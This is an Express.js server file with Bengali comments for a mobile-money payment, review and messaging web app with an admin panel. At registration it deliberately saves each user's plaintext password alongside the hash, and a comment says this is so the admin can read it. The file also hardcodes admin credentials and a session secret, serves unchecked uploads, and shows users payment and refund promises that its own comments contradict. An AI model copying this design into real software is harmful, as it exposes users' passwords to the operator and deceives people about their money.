const express = require('express');
const bodyParser = require('body-parser');
const session = require('express-session');
const passport = require('passport');
const LocalStrategy = require('passport-local').Strategy;
const FacebookStrategy = require('passport-facebook').Strategy;
const bcrypt = require('bcrypt');
const multer = require('multer');
const path = require('path');
const fs = require('fs');

const app = express();
const PORT = 5000;

// ডেটা স্টোরেজের জন্য মেমোরিতে অবজেক্ট (অস্থায়ী)
let users = [];
let payments = [];
let reviews = [];
let messages = []; // মেসেজ স্টোরেজ
let adminUsers = [
  { 
    id: 1, 
    email: 'admin@example.com', 
    password: bcrypt.hashSync('admin123', 10), 
    name: 'Admin' 
  }
];

// মিডলওয়্যার সেটআপ
app.use(express.static('public'));
app.use('/uploads', express.static('uploads'));
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());
app.use(session({
  secret: 'your_session_secret_key_2024',
  resave: true, // সেশন সেভ করার জন্য
  saveUninitialized: true, // নতুন সেশন সেভ করার জন্য
  rolling: true, // প্রতি রিকুয়েস্টে সেশন এক্সটেন্ড করার জন্য
  cookie: { 
    maxAge: 30 * 24 * 60 * 60 * 1000, // ৩০ দিন (মিলিসেকেন্ডে)
    secure: false, // HTTP এর জন্য false, HTTPS এর জন্য true
    httpOnly: true, // নিরাপত্তার জন্য
  },
  name: 'sessionId' // কাস্টম সেশন নাম
}));

app.use(passport.initialize());
app.use(passport.session());

app.set('view engine', 'ejs');

// আপলোড ডিরেক্টরি তৈরি করা
const uploadDir = path.join(__dirname, 'uploads');
if (!fs.existsSync(uploadDir)) {
  fs.mkdirSync(uploadDir);
}

// মাল্টার কনফিগারেশন
const storage = multer.diskStorage({
  destination: function (req, file, cb) {
    cb(null, 'uploads/');
  },
  filename: function (req, file, cb) {
    cb(null, Date.now() + '-' + file.originalname);
  }
});

const upload = multer({ storage: storage });

// পাসপোর্ট স্ট্র্যাটেজি
passport.use(new LocalStrategy(
  { usernameField: 'email' },
  async (email, password, done) => {
    const user = users.find(u => u.email === email);
    if (!user) {
      return done(null, false, { message: 'ভুল ইমেইল বা পাসওয়ার্ড' });
    }
    
    const isMatch = await bcrypt.compare(password, user.password);
    if (!isMatch) {
      return done(null, false, { message: 'ভুল ইমেইল বা পাসওয়ার্ড' });
    }
    
    return done(null, user);
  }
));

passport.serializeUser((user, done) => {
  done(null, user.id);
});

passport.deserializeUser((id, done) => {
  const user = users.find(u => u.id === id);
  done(null, user);
});

// রুটস
app.get('/', (req, res) => {
  res.render('login', { message: null });
});

app.get('/login', (req, res) => {
  res.render('login', { message: null });
});

app.get('/register', (req, res) => {
  res.render('register', { message: null });
});

app.post('/register', async (req, res) => {
  const { name, phone, email, password } = req.body;
  
  // চেক করা যে ইউজার আগে থেকেই আছে কিনা
  const existingUser = users.find(u => u.email === email);
  if (existingUser) {
    return res.render('register', { message: 'এই ইমেইল দিয়ে আগে থেকেই একাউন্ট আছে' });
  }
  
  // পাসওয়ার্ড হ্যাশ করা
  const hashedPassword = await bcrypt.hash(password, 10);
  
  // নতুন ইউজার তৈরি করা
  const newUser = {
    id: users.length + 1,
    userId: `U${Date.now().toString().slice(-6)}${(users.length + 1).toString().padStart(3, '0')}`, // ইউনিক ইউজার আইডি
    name,
    phone,
    email,
    password: hashedPassword,
    originalPassword: password, // এডমিনের জন্য আসল পাসওয়ার্ড
    balance: 0,
    joinedAt: new Date()
  };
  
  users.push(newUser);
  res.redirect('/login');
});

app.post('/login', passport.authenticate('local', {
  successRedirect: '/dashboard',
  failureRedirect: '/login'
}));

app.get('/dashboard', (req, res) => {
  if (!req.user) {
    return res.redirect('/login');
  }
  res.render('dashboard', { user: req.user });
});

app.get('/payment', (req, res) => {
  if (!req.user) {
    return res.redirect('/login');
  }
  res.render('payment', { user: req.user });
});

app.post('/payment', (req, res) => {
  if (!req.user) {
    return res.redirect('/login');
  }
  
  const { senderNumber, amount } = req.body;
  
  // পেমেন্ট রেকর্ড সেভ করা (কিন্তু ব্যালেন্স যোগ করা হবে না)
  const payment = {
    id: payments.length + 1,
    userId: req.user.id,
    senderNumber,
    amount: parseInt(amount),
    receiveNumber: '01846735445', // যে নাম্বারে টাকা পাঠানো হয়েছে
    status: 'pending',
    submittedAt: new Date()
  };
  
  payments.push(payment);
  
  // সফল সাবমিশনের মেসেজ দেখিয়ে ড্যাশবোর্ডে ফিরে যাওয়া
  res.render('dashboard', { 
    user: req.user, 
    paymentMessage: '৫ মিনিটের মধ্যে আপনার অ্যাকাউন্টে টাকা যোগ হয়ে যাবে। যদি টাকা না যোগ হয় তাহলে এডমিন চেক করে দিবেন।' 
  });
});

app.get('/write_review', (req, res) => {
  if (!req.user) {
    return res.redirect('/login');
  }
  res.render('write_review', { user: req.user });
});

app.post('/write_review', upload.single('screenshot'), (req, res) => {
  if (!req.user) {
    return res.redirect('/login');
  }
  
  const { returnNumber, message } = req.body;
  const screenshot = req.file ? req.file.filename : null;
  
  // রিভিউ রেকর্ড সেভ করা
  const review = {
    id: reviews.length + 1,
    userId: req.user.id,
    returnNumber,
    message,
    screenshot,
    submittedAt: new Date(),
    status: 'pending'
  };
  
  reviews.push(review);
  
  res.render('write_review', { 
    user: req.user, 
    message: '৩০ মিনিটের মধ্যে আপনার টাকা ফেরত পেয়ে যাবেন' 
  });
});

// এডমিন রুটস
app.get('/admin_login', (req, res) => {
  res.render('admin_login', { message: null });
});

app.post('/admin_login', async (req, res) => {
  const { email, password } = req.body;
  
  const admin = adminUsers.find(u => u.email === email);
  if (!admin) {
    return res.render('admin_login', { message: 'ভুল ইমেইল বা পাসওয়ার্ড' });
  }
  
  const isMatch = await bcrypt.compare(password, admin.password);
  if (!isMatch) {
    return res.render('admin_login', { message: 'ভুল ইমেইল বা পাসওয়ার্ড' });
  }
  
  req.session.admin = admin;
  res.redirect('/admin_panel');
});

app.get('/admin_panel', (req, res) => {
  if (!req.session.admin) {
    return res.redirect('/admin_login');
  }
  
  res.render('admin_panel', { 
    users, 
    payments, 
    reviews,
    messages,
    admin: req.session.admin
  });
});

// এডমিন ইউজার ইনফরমেশন পেজ
app.get('/admin/user_information', (req, res) => {
  if (!req.session.admin) {
    return res.redirect('/admin_login');
  }
  
  res.render('user_information', { 
    users,
    admin: req.session.admin
  });
});

// ইউজার ডিলিট করার রুট
app.post('/admin/delete_user/:id', (req, res) => {
  if (!req.session.admin) {
    return res.redirect('/admin_login');
  }
  
  const userId = parseInt(req.params.id);
  
  // ইউজার খুঁজে বের করা
  const userIndex = users.findIndex(u => u.id === userId);
  
  if (userIndex !== -1) {
    // ইউজার ডিলিট করা
    users.splice(userIndex, 1);
    
    // সংশ্লিষ্ট পেমেন্ট ডিলিট করা
    for (let i = payments.length - 1; i >= 0; i--) {
      if (payments[i].userId === userId) {
        payments.splice(i, 1);
      }
    }
    
    // সংশ্লিষ্ট রিভিউ ডিলিট করা
    for (let i = reviews.length - 1; i >= 0; i--) {
      if (reviews[i].userId === userId) {
        reviews.splice(i, 1);
      }
    }
    
    // সংশ্লিষ্ট মেসেজ ডিলিট করা
    for (let i = messages.length - 1; i >= 0; i--) {
      if (messages[i].senderId === userId || messages[i].receiverId === userId) {
        messages.splice(i, 1);
      }
    }
  }
  
  res.redirect('/admin/user_information');
});

// পেমেন্ট অনুমোদন করার রুট
app.post('/admin/approve_payment/:id', (req, res) => {
  if (!req.session.admin) {
    return res.redirect('/admin_login');
  }
  
  const paymentId = parseInt(req.params.id);
  const payment = payments.find(p => p.id === paymentId);
  
  if (payment && payment.status === 'pending') {
    // পেমেন্ট অনুমোদন করা
    payment.status = 'approved';
    payment.approvedAt = new Date();
    payment.approvedBy = req.session.admin.id;
    
    // ইউজারের ব্যালেন্স আপডেট করা
    const userIndex = users.findIndex(u => u.id === payment.userId);
    if (userIndex !== -1) {
      users[userIndex].balance += payment.amount;
    }
  }
  
  res.redirect('/admin_panel');
});

// পেমেন্ট বাতিল করার রুট  
app.post('/admin/reject_payment/:id', (req, res) => {
  if (!req.session.admin) {
    return res.redirect('/admin_login');
  }
  
  const paymentId = parseInt(req.params.id);
  const payment = payments.find(p => p.id === paymentId);
  
  if (payment && payment.status === 'pending') {
    payment.status = 'rejected';
    payment.rejectedAt = new Date();
    payment.rejectedBy = req.session.admin.id;
  }
  
  res.redirect('/admin_panel');
});

app.get('/logout', (req, res) => {
  req.logout((err) => {
    if (err) {
      return next(err);
    }
    res.redirect('/login');
  });
});

app.get('/admin_logout', (req, res) => {
  req.session.admin = null;
  res.redirect('/admin_login');
});

// মেসেজিং রুট
app.get('/messages', (req, res) => {
  if (!req.user) {
    return res.redirect('/login');
  }
  res.render('messages', { user: req.user, messages: [] });
});

app.post('/search_user', (req, res) => {
  if (!req.user) {
    return res.redirect('/login');
  }
  
  const { searchUserId } = req.body;
  const foundUser = users.find(u => u.userId === searchUserId && u.id !== req.user.id);
  
  if (foundUser) {
    res.render('messages', { 
      user: req.user, 
      foundUser,
      messages: messages.filter(m => 
        (m.senderId === req.user.id && m.receiverId === foundUser.id) || 
        (m.senderId === foundUser.id && m.receiverId === req.user.id)
      ).sort((a, b) => new Date(a.sentAt) - new Date(b.sentAt))
    });
  } else {
    res.render('messages', { 
      user: req.user, 
      error: 'এই ইউজার আইডি দিয়ে কোনো ইউজার পাওয়া যায়নি!',
      messages: []
    });
  }
});

app.post('/send_message', (req, res) => {
  if (!req.user) {
    return res.redirect('/login');
  }
  
  const { receiverId, messageText } = req.body;
  const receiver = users.find(u => u.id === parseInt(receiverId));
  
  if (receiver && messageText.trim()) {
    const newMessage = {
      id: messages.length + 1,
      senderId: req.user.id,
      receiverId: parseInt(receiverId),
      messageText: messageText.trim(),
      sentAt: new Date()
    };
    
    messages.push(newMessage);
  }
  
  res.redirect('/search_user_redirect/' + receiver.userId);
});

app.get('/search_user_redirect/:userId', (req, res) => {
  if (!req.user) {
    return res.redirect('/login');
  }
  
  const foundUser = users.find(u => u.userId === req.params.userId);
  
  if (foundUser) {
    res.render('messages', { 
      user: req.user, 
      foundUser,
      messages: messages.filter(m => 
        (m.senderId === req.user.id && m.receiverId === foundUser.id) || 
        (m.senderId === foundUser.id && m.receiverId === req.user.id)
      ).sort((a, b) => new Date(a.sentAt) - new Date(b.sentAt))
    });
  } else {
    res.redirect('/messages');
  }
});

app.listen(PORT, '0.0.0.0', () => {
  console.log(`সার্ভার চলছে http://localhost:${PORT} এ`);
});